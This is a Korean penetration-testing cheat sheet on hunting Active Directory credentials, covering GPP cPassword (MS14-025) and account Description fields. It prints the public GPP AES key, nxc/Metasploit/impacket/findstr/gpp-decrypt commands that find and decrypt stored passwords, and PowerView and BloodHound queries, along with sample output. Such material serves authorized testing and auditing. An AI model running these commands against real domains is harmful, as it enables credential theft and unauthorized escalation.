# 08_GPP_cPassword_Description헌팅

# AD 내부침투 — GPP/cPassword & Description 필드 헌팅

도메인 유저라면 인증만으로 바로 시도해볼 수 있는, 비용 대비 성공률이 높은 크리덴셜 헌팅 기법 두 가지.

---

## 1. GPP/cPassword (MS14-025)

Group Policy Preferences(GPP)로 "이 컴퓨터들은 부팅하면 자동으로 이 계정으로 로그인해라" 같은 설정(Autologon, 드라이브 매핑, 로컬 계정 생성, 서비스 계정, 예약 작업, 프린터 등)을 걸면, 그 설정값(유저명+비번)이 XML 파일에 AES-256으로 암호화되어 SYSVOL에 저장된다. 문제는 Microsoft가 이 암호화에 쓰는 AES 키를 공식 문서(MSDN)에 그대로 공개해버렸다는 것 — MS14-025로 2014년 패치됐지만, 패치는 "새 정책 생성"만 막을 뿐 이미 SYSVOL에 저장된 기존 XML 파일은 그대로 남는다. 즉 이 파일만 찾으면 일반 도메인 유저 권한만으로도 즉시 평문 복호화가 가능하다. SYSVOL은 모든 도메인 유저가 읽기 가능한 공유라 별도 권한 없이도 접근 가능하다.

```
공개된 AES 키: 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
(고정 키 + null IV로 항상 동일하게 암호화됨 — 키 자체를 추측/크랙할 필요 없이 바로 복호화 가능)

암호화된 값이 들어갈 수 있는 XML 파일 종류:
Groups.xml         -> 로컬 계정 생성/비밀번호 변경
Services.xml       -> 서비스 계정
ScheduledTasks.xml -> 예약 작업 실행 계정
Printers.xml       -> 프린터 매핑 계정
Drives.xml         -> 네트워크 드라이브 매핑 계정
DataSources.xml    -> 데이터 소스 연결 계정
```

### 자동 도구

```bash
# netexec/nxc — Registry.xml(Autologon) 전용
nxc smb <DC_IP> -u <유저> -p '<비번>' -M gpp_autologin

# netexec/nxc — Groups.xml(로컬 계정 비번) 포함 전체
nxc smb <DC_IP> -u <유저> -p '<비번>' -M gpp_password

# Metasploit — 세션 확보 후
use post/windows/gather/credentials/gpp
set SESSION <세션ID>
run
```

**성공 시**: 크리덴셜(유저명+평문 비번)이 바로 콘솔에 출력된다.

```
GPP_PASS... [+] Found Groups.xml
GPP_PASS... Usernames: ['localadmin']
GPP_PASS... Passwords: ['S3cr3tP@ss!']
```

**실패(dead-end) 시**: 해당 XML 파일 자체를 못 찾고 spidering만 끝난다 — 이거로 끝이다.

```
GPP_AUTO... [+] Found SYSVOL share
GPP_AUTO... [*] Searching for Registry.xml
[*] Done spidering (Completed in ...)
```

### 수동/대안 도구 (자동 모듈이 안 될 때)

```bash
# Get-GPPPassword.py (impacket 계열, breadth-first로 전체 공유를 돌며 cpassword 찾아 자동 복호화)
python3 Get-GPPPassword.py -u '<유저>' -p '<비번>' -d <도메인> <DC_IP>

# 순수 파일명 검색 (SYSVOL 마운트/공유 연결 후)
find /mnt/sysvol -iname "Groups.xml" -o -iname "Registry.xml" -o -iname "Services.xml" -o -iname "ScheduledTasks.xml" -o -iname "Printers.xml" -o -iname "Drives.xml" 2>/dev/null

# Windows에서, findstr로 SYSVOL 전체에서 cpassword 문자열 검색
findstr /S /I cpassword \\<DC_FQDN>\sysvol\<도메인>\policies\*.xml
```

### 수동 복호화 (공개된 AES 키 사용)

```bash
# gpp-decrypt — cpassword 값 하나를 직접 복호화 (칼리 기본 내장)
gpp-decrypt '<cpassword 값>'
```

---

## 2. Description 필드 크리덴셜 헌팅

모든 AD 계정(유저/컴퓨터)에는 관리자가 메모를 남기는 Description 필드가 있다. 일반 도메인 유저 권한만으로 조회 가능하며, 관리자가 실수로 임시 비번이나 힌트를 적어둔 경우가 종종 있다.

```bash
# nxc — 공식 모듈명은 get-desc-users (일부 버전/문서에는 user-desc로도 표기됨)
nxc ldap <DC_IP> -u <유저> -p '<비번>' -M get-desc-users

# 옵션 — FILTER로 description 안 특정 문자열 포함 여부 필터링
nxc ldap <DC_IP> -u <유저> -p '<비번>' -M get-desc-users -o FILTER=pass

# 옵션 — PASSWORDPOLICY: 윈도우 비밀번호 복잡도 요구사항에 맞는 값만 추출
# 옵션 — MINLENGTH: 최소 길이 지정 (--pass-pol로 미리 확인한 정책값 활용 가능)
nxc ldap <DC_IP> -u <유저> -p '<비번>' -M get-desc-users -o PASSWORDPOLICY=true MINLENGTH=8
```

**성공 시**: 빌트인 계정(Administrator, Guest, krbtgt) 외의 **커스텀 계정**에서 비번 패턴이 보임.

```
User: tempsvc description: temp password Welcome2024! - contact IT
```

**실패(dead-end) 시**: 빌트인 계정 설명만 나오고 끝남 (이 경우는 정말 소득 없는 것, FILTER 키워드를 바꿔 보거나 다음 기법으로 넘어갈 것).

```
User: Administrator description: Built-in account for administering the computer/domain
User: Guest description: Built-in account for guest access to the computer/domain
User: krbtgt description: Key Distribution Center Service Account
```

### PowerView 대안

```powershell
Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $null}
```

### Cypher (BloodHound 이미 임포트된 경우)

```
MATCH (u:User)
WHERE toUpper(u.description) CONTAINS 'PASS'
   OR toUpper(u.description) CONTAINS 'PWD'
   OR toUpper(u.description) CONTAINS 'CRED'
RETURN u.name, u.description
```

---

## 팁

- GPP는 "안 되면 바로 다음으로" 넘어갈 만큼 빠르고 비용이 거의 없는 체크다 — 매번 침투 초반에 시도할 가치 있음
- Description 필드도 마찬가지 — 조회 비용이 거의 없으니 놓치지 말 것
- 둘 다 sysadmin/DA 권한 없이도, 일반 도메인 유저 권한만으로 동작함
- GPP는 패치(MS14-025) 여부와 무관하게, 패치 이전에 만들어진 정책이 SYSVOL에 남아있으면 여전히 유효함 — "패치됐으니 안 될 것"이라고 넘겨짚지 말 것